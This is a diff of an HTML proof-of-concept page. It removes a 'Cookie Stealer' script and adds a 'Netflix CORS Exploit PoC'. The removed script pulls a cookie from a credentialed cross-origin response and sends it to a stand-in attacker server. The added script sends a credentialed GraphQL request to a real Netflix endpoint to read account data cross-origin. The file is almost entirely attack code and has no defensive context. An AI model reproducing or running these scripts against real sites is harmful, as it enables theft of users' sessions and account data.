@@ -1,24 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head>
-<title>Cookie Stealer</title>
-</head>
 <body>
+<h2>Netflix CORS Exploit PoC</h2>
+<button onclick="exploit()">Exploit</button>
+
 <script>
-fetch('https://vulnerable-application.com/sensitive-endpoint', {
-  credentials: 'include'
-})
-.then(response => response.text())
-.then(data => {
-  // Extract the cookie from the response (this will vary)
-  // For example, if the cookie is in the response body:
-  const cookie = data.match(/cookie=([^;]+)/)[1];
-
-  alert('Stolen Cookie: ' + cookie);
-
-  // Send the cookie to the attacker's server (for demonstration)
-  fetch('https://attacker-server.com/steal?cookie=' + cookie);
-});
+function exploit() {
+  fetch('https://web.prod.cloud.netflix.com/graphql', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      operationName: "CLCSInterstitialAccountPages",
+      variables: { ... },
+      extensions: {
+        persistedQuery: { id: "EXISTING-ID", version: 102 }
+      }
+    })
+  }).then(res => res.text())
+    .then(data => alert(data));
+}
 </script>
+
 </body>
 </html>
